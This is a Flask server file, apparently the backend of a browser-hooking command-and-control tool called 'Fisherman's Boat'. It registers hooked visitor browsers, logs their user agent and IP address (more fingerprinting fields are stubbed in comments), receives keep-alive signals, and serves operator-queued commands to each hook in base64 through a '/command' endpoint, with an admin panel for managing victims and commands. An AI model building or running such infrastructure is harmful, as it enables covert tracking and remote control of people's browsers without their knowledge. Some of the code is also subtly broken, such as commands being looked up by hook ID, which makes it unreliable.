from flask import Flask, jsonify, render_template, abort, request, session
from flask_admin import Admin as FlaskAdmin
from flask_sqlalchemy import SQLAlchemy
import flask_login as login
from datetime import datetime
import base64
from app.views.admin import MyAdminIndexView, HookModelView, CommandView

app = Flask(__name__)
app.config.from_pyfile("config.py")


admin = FlaskAdmin(app, name="Fisherman's Boat", template_mode='bootstrap3', index_view=MyAdminIndexView())

db = SQLAlchemy()
db.init_app(app)

class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    command = db.Column(db.String(256), nullable=False)

    def __repr__(self):
        return f'<Command {self.command}>'

class Hook(db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    last_update = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    user_agent = db.Column(db.String(255))
    ip_address = db.Column(db.String(45))  # 45 to accommodate IPv6 addresses
    screen_resolution = db.Column(db.String(50))
    timezone = db.Column(db.String(50))
    language = db.Column(db.String(50))
    browser_plugins = db.Column(db.Text)
    # Add other fields for fingerprinting if needed

    def __repr__(self):
        return f'<Hook {self.id}>'
    

class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    login = db.Column(db.String(80), unique=True)
    password = db.Column(db.String(64))

    @property
    def is_authenticated(self):
        return True

    @property
    def is_active(self):
        return True

    @property
    def is_anonymous(self):
        return False

    def get_id(self):
        return self.id

    # Required for administrative interface
    def __unicode__(self):
        return self.username

with app.app_context():
    db.create_all()

admin.add_view(HookModelView(Hook, db.session))
admin.add_view(CommandView(Command, db.session))

login_manager = login.LoginManager()
login_manager.init_app(app)

# Create user loader function
@login_manager.user_loader
def load_user(user_id):
    return db.session.query(Admin).get(user_id)

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/hook', methods=['POST'])
def hook():
    user_agent = request.headers.get('User-Agent')
    ip_address = request.remote_addr

    # Get additional fingerprinting data from the request JSON body
    # TODO : move to seperate modules
    """
    data = request.json
    screen_resolution = data.get('screen_resolution')
    timezone = data.get('timezone')
    language = data.get('language')
    browser_plugins = data.get('browser_plugins')
    """

    new_hook = Hook(
        user_agent=user_agent,
        ip_address=ip_address
    )
    new_command_manager = Command()
    db.session.add(new_hook)
    db.session.add(new_command_manager)
    db.session.commit()

    session['hook_id'] = new_hook.id

    return jsonify({'message': f'Hook created with ID {new_hook.id}'}), 201 # TODO : Change to something else



@app.route('/alive', methods=['GET', 'POST'])
def alive():
    app.logger.info(f'Got alive signal from {session.get('hook_id')}')
    return jsonify(message='Hello')


@app.route('/command', methods=['POST'])
def bait():
    hook_id = session.get('hook_id')
    if not hook_id:
        abort(403)

    command_row = Command.query.get(hook_id)
    if not command_row:
        app.logger.info("No commands found in the database")
        abort(404)
    
    # Retrieve the command attribute
    command_value = command_row.command

    # Delete the first Command object from the database
    db.session.delete(command_row)
    db.session.commit()

    app.logger.info(f"Retrieved and deleted the first command: {command_value}")
    return jsonify(command=base64.b64encode(command_value.encode()).decode())



if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)



